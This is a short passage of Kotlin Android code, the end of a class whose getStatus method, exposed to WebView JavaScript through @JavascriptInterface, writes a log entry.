    @JavascriptInterface
    fun getStatus() {
        android.util.Log.i("JSBridge", "getStatus queried")
    }
}
